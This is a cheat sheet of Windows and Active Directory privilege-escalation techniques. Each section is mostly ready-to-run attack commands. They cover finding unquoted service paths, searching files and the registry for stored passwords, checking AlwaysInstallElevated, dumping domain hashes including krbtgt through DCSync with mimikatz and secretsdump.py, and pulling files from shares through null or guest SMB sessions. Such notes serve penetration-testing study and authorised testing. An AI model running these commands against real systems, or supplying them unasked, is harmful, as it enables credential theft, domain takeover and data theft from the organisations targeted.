# Windows Privilege Escalation

__Privilege Escalation Notes for Active Directory__

## Unquoted Service Paths

It is possible to escalate privileges if there's a running service, of which the service binary which is running is not quoted. Not wrapping binary paths can allow us to place a malicious binary in place of the path which later can get executed at service restart.

__Scenario__

There's a program running in windows system:

C:\Applications\Web Server\webserver.exe

In this case, we can place a malicious binary at C:\Applications\Web.exe which will get executed as the previous path isn't enclosed in quotes, windows will execute the binary before the whitespace " ".


__Looking for unquoted service paths__

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
PowerSploit module:

```powershell
Get-ServiceUnquoted
```
---

## Cleartext passwords

Administrators/users might save sensitive information like login credentials across the machines, we can try looking for them.

```batch
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*

# Finding credentials in windows registry

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Putty clear text proxy credentials
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
```
---
## AlwaysInstallElevated

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. However, granting users this ability is a security concern because it is too easy to abuse this privilege.   For this to occur, there are two registry entries that have to be set to the value of “1” on the machine:

```batch
# Querying windows registry for "AlwaysInstallElevated"

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
---
## DCSync Attack

This attack allows an attacker to mimic as Domain Controller and dump hashes. We must have foothold of a user with "Domain Replication Service Remote Protocol" privileges to perform this attack.

```powershell
# Using mimikatz to perform DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt /domain:domain-corp.local"'

# Using "Invoke-DCSync" PS module (https://gist.github.com/monoxgas/9d238accd969550136db)
Invoke-DCSync -PWDumpFormat
```

```bash
# Using secretsdump.py to perform DCSync Attack
secretsdump.py -just-dc <user>:<password>@<ipaddress>
```
---
## Open Shares

There can be open shares in the network which can expose sensitive information.

```bash
# Null Session
smbclient -I 10.10.10.100 -L ACTIVE -N -U ""

# Guest login
smbclient -I 10.10.10.100 --user "invalidUser"
```

Downloading a folder recursively

```bash
smbclient //10.0.0.1/Share --user=User123
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> lcd '/path/to/go/'
smb: \> mget *
```
---
